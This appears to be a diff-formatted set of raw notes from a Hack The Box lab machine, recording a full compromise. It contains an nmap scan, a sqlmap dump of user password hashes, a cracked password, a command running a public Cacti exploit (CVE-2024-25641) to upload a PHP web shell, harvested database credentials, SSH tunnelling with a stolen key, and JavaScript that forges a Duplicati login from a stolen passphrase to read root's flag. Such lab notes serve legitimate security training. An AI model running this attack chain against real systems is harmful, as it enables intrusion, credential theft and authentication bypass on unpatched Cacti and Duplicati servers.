@@ -1,0 +1,83 @@
+└─$ nmap -A 10.10.11.30 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-29 11:42 CEST
+Nmap scan report for 10.10.11.30
+Host is up (0.037s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 86f87d6f4291bb897291af72f301ff5b (ECDSA)
+|_  256 50f9ed8e73649eaaf6089514f0a60d57 (ED25519)
+80/tcp   open     http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://monitorsthree.htb/
+8084/tcp filtered websnp
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+sqlmap -r cacti.txt -D monitorsthree_db -T users --dump 
+
++----+------------+-------------------+-----------------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+| id | dob        | name              | email                       | salary    | password                         | username  | position              | start_date |
++----+------------+-------------------+-----------------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+| 2  | 1978-04-25 | Marcus Higgins    | admin@monitorsthree.htb     | 320800.00 | 31a181c8372e3afc59dab863430610e8 | admin     | Super User            | 2021-01-12 |
+| 5  | 1985-02-15 | Michael Watson    | mwatson@monitorsthree.htb   | 75000.00  | c585d01f2eb3e6e1073e92023088a3dd | mwatson   | Website Administrator | 2021-05-10 |
+| 6  | 1990-07-30 | Jennifer Anderson | janderson@monitorsthree.htb | 68000.00  | 1e68b6eb86b45f6d92f8f292428f77ac | janderson | Network Engineer      | 2021-06-20 |
+| 7  | 1982-11-23 | David Thompson    | dthompson@monitorsthree.htb | 83000.00  | 633b683cc128fe244b00f176c8a950f5 | dthompson | Database Manager      | 2022-09-15 |
++----+------------+-------------------+-----------------------------+-----------+----------------------------------+-----------+-----------------------+------------+
+
+greencacti2001
+
+https://github.com/5ma1l/CVE-2024-25641
+python3 exploit.py http://cacti.monitorsthree.htb/cacti admin greencacti2001 -p php/monkey.php
+
+$dsn = 'mysql:host=127.0.0.1;port=3306;dbname=monitorsthree_db';
+$username = 'app_user';
+$password = 'php_app_password';
+
+$database_type     = 'mysql';
+$database_default  = 'cacti';
+$database_username = 'cactiuser';
+$database_password = 'cactiuser';
+$database_port     = '3306';
+$database_ssl      = false;
+
+mysql -u cactiuser -h localhost -P 3306 cacti -p
+select * from user_auth;
+
+su marcus
+Password: 12345678910
+
+ssh 10.10.11.30 -l marcus -i id_priv
+
+ssh -L 1234:localhost:8200 marcus@10.10.11.30 -i id_priv
+scp -i id_priv marcus@10.10.11.30:/opt/duplicati/config/CTADPNHLTC.sqlite .  
+sqlitebrowser Duplicati-server.sqlite 
+
+https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee
+
+server-passphrase	Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
+server-passphrase-salt	xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
+server-passphrase-trayicon	db57e77d-626f-4db2-86b4-292b15f48165
+server-passphrase-trayicon-hash	wlUBhXJd/2cmwd4uF1PEDm+n3kKIFa1aGRh+y5XBdug=
+
+59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
+
+var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('LPip+qJLi+ez0LjrnqPbJjGeE31mRR9n0tF6G/UY/Po=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);
+
+edVmKZo2GX6/GstGH1NGVY6S1JFg/X6Kdzu3uArlzcU=
+
+
+var saltedpwd = "59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a";
+var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse("n3npYyWrpN0cG6GyYBPz4KH06eG5D0GJrCZymfHkubo=") + saltedpwd)).toString(CryptoJS.enc.Base64);
+console.log(noncedpwd);
+
+var saltedpwd = '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a'; // Replace with the Hex output from step 6
+var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('TPvXubEESZM8rkUpBDWNGvhiYqVf3e9HnyMqkjhYjT4=') + saltedpwd)).toString(CryptoJS.enc.Base64); // Replace 'NonceFromBurp' with the intercepted nonce
+console.log(noncedpwd);
+
+sgi9nnUa+mn3UJwPz8ZgrXB7BteM7lUcEIa2Fp0mTAo=
+
+OTZ/pk/tU0Fo+EKnuIHAmgzTfMDT7xRqPKfUIfI0Kcs=
+
+add /source/root/root.txt to backup
+restore to /source/tmp
